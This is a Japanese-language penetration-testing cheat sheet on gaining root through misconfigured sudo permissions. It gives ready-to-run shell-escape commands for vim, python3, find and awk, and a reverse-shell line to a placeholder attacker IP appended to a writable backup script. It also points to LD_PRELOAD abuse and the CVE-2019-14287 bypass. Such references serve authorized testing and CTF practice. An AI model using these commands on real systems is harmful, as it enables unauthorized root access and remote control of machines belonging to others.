# sudo 設定不備による権限昇格

## 概要

`/etc/sudoers` の設定ミスにより、特定のコマンドをパスワードなしで root として実行できる場合がある。

---

## 着火条件

```bash
sudo -l
```

出力に `NOPASSWD` または特定コマンドへの許可が含まれている場合。

---

## 典型的な出力パターンと対応

### パターン1: 特定コマンドに NOPASSWD

```
(ALL) NOPASSWD: /usr/bin/vim
(ALL) NOPASSWD: /usr/bin/python3
(ALL) NOPASSWD: /usr/bin/find
```

→ GTFOBins で対象コマンドの「Sudo」セクションを確認

### パターン2: ALL コマンドを許可

```
(ALL) NOPASSWD: ALL
```

→ `sudo /bin/bash` で即座に root

### パターン3: 特定スクリプトの実行を許可

```
(ALL) NOPASSWD: /opt/scripts/backup.sh
```

→ スクリプト自体が書き込み可能であれば改ざんして権限昇格

---

## 悪用手順

### vim / nano / less

```bash
sudo vim -c ':!/bin/bash'
sudo vim -c ':py3 import os; os.execl("/bin/bash", "bash", "-c", "reset; exec bash")'
```

### python / python3

```bash
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'
```

### find

```bash
sudo find . -exec /bin/bash \; -quit
```

### awk

```bash
sudo awk 'BEGIN {system("/bin/bash")}'
```

### 任意スクリプトが書き込み可能な場合

```bash
# スクリプトにリバースシェルを追記
echo 'bash -i >& /dev/tcp/[ATTACKER_IP]/4444 0>&1' >> /opt/scripts/backup.sh

# sudo で実行
sudo /opt/scripts/backup.sh
```

---

## 注意点・落とし穴

- `sudo -l` でパスワードを求められる場合でも、現在のユーザーのパスワードが判明していれば入力できる
- `env_keep` の設定次第では環境変数（`LD_PRELOAD` 等）を引き継いで悪用できる
- sudoers の `!root` 指定（特定ユーザー以外として実行）は古い sudo でバイパスできる場合がある（CVE-2019-14287）

---

## 関連技術
- GTFOBins: https://gtfobins.github.io/
- その他の昇格手法 → `Capabilities.md`, `SUID_SGID.md`
